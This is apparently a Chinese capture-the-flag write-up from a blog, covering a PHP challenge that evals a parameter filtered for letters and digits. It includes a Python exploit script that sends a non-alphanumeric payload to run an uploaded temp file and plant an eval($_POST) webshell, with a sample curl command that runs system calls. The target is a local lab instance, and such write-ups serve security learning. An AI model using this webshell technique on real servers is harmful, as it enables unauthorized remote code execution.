<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">    $shell = $_GET[&#x27;shell&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/[A-Za-z0-9]/is&#x27;, $_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">        eval($shell);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>无数字字母rce，使用Wappalyzer查看php版本为5。参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7702">无字母数字webshell总结-先知社区</a>。</p>
<p>脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from urllib.parse import urlencode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_success(url):</span><br><span class="line">    &quot;&quot;&quot;检查是否成功上传webshell&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        test_data = &#123;&#x27;shell&#x27;: &#x27;echo &quot;WEBSHELL_TEST&quot;;&#x27;&#125;</span><br><span class="line">        response = requests.post(url, data=test_data, timeout=5)</span><br><span class="line">        if &#x27;WEBSHELL_TEST&#x27; in response.text:</span><br><span class="line">            return True</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit_get_params_with_post_file():</span><br><span class="line">    base_url = &quot;http://127.0.0.1:53746/&quot;</span><br><span class="line">    shell_url = &quot;http://127.0.0.1:53746/success.php&quot;</span><br><span class="line"></span><br><span class="line">    # GET参数</span><br><span class="line">    get_params = &#123;</span><br><span class="line">        &#x27;shell&#x27;: &#x27;&#x27;&#x27;?&gt;&lt;?=`. /???/????????[@-[]`?&gt;&#x27;&#x27;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 文件内容 - 通过POST上传</span><br><span class="line">    file_content = &#x27;&#x27;&#x27;echo &#x27;&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">eval($_POST[1]);?&gt;&#x27; &gt; success.php&#x27;&#x27;&#x27;</span><br><span class="line">    files = &#123;</span><br><span class="line">        &#x27;file&#x27;: (&#x27;1.txt&#x27;, file_content, &#x27;text/plain&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 构建带GET参数的URL</span><br><span class="line">    target_url = f&quot;&#123;base_url&#125;?&#123;urlencode(get_params)&#125;&quot;</span><br><span class="line"></span><br><span class="line">    print(&quot;开始尝试上传webshell...&quot;)</span><br><span class="line">    print(f&quot;目标URL: &#123;target_url&#125;&quot;)</span><br><span class="line">    print(f&quot;Webshell位置: &#123;shell_url&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line">    attempt = 1</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            print(f&quot;尝试第 &#123;attempt&#125; 次...&quot;)</span><br><span class="line"></span><br><span class="line">            # 发送POST请求（包含文件），URL中带有GET参数</span><br><span class="line">            response = requests.post(</span><br><span class="line">                target_url,</span><br><span class="line">                files=files,</span><br><span class="line">                timeout=10</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            print(f&quot;请求状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line">            print(f&quot;响应长度: &#123;len(response.text)&#125; 字节&quot;)</span><br><span class="line"></span><br><span class="line">            # 检查是否成功</span><br><span class="line">            if check_success(shell_url):</span><br><span class="line">                print(&quot;\n&quot; + &quot;=&quot; * 60)</span><br><span class="line">                print(&quot;✅ Webshell上传成功！&quot;)</span><br><span class="line">                print(f&quot;Webshell地址: &#123;shell_url&#125;&quot;)</span><br><span class="line">                print(&quot;使用方法: POST方式发送 shell=你的命令&quot;)</span><br><span class="line">                print(&quot;示例: curl -X POST -d \&quot;shell=system(&#x27;whoami&#x27;);\&quot; &quot; + shell_url)</span><br><span class="line">                print(&quot;=&quot; * 60)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;❌ 尚未成功，等待3秒后重试...&quot;)</span><br><span class="line">                time.sleep(3)</span><br><span class="line"></span><br><span class="line">        except requests.exceptions.ConnectionError:</span><br><span class="line">            print(&quot;❌ 连接失败，检查服务是否启动&quot;)</span><br><span class="line">            time.sleep(5)</span><br><span class="line">        except requests.exceptions.Timeout:</span><br><span class="line">            print(&quot;⏰ 请求超时，继续尝试...&quot;)</span><br><span class="line">            time.sleep(3)</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            print(&quot;\n用户中断操作&quot;)</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;⚠️  发生错误: &#123;e&#125;&quot;)</span><br><span class="line">            time.sleep(3)</span><br><span class="line"></span><br><span class="line">        attempt += 1</span><br><span class="line">        if attempt % 10 == 0:</span><br><span class="line">            print(&quot;等待5秒继续...&quot;)</span><br><span class="line">            time.sleep(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    exploit_get_params_with_post_file()</span><br></pre></td></tr></table></figure>

<p>之后访问success.php就可以getshell了。</p>
<h3 id="这是…Webshell-revenge"><a href="#这是…Webshell-revenge" class="headerlink" title="这是…Webshell?_revenge"></a>这是…Webshell?_revenge</h3><p>payload跟**这是…Webshell?**一样。咱上题好像用的方法太狠了喵呜。</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>伊卡洛维奇</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://lunereal.1kal0vic.top/2025/04/22/moe%E6%88%98%E6%9E%9C/" title="2025moectf web misc wp">http://lunereal.1kal0vic.top/2025/04/22/moe%E6%88%98%E6%9E%9C/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/04/22/TGctf%E5%A4%8D%E7%8E%B0/" rel="prev" title="TGctf复现"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">TGctf复现</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/04/20/UCSC%E6%88%98%E6%9E%9C/" rel="next" title="UCSC战果"><span class="post-nav-text">UCSC战果</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 伊卡洛维奇</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>感谢陪伴</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2024-03-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
}
blog_live_time();
</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div><div class="footer-support"><span>本站由</span><a class="footer-support-logo" href="https://www.rainyun.com/YeMeng_" target="blank" title="雨云"><img height="30" src="https://cn-sy1.rains3.com/yemenghexo/rainyunlogo.png" alt="雨云"></a><span>提供 对象存储 服务</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>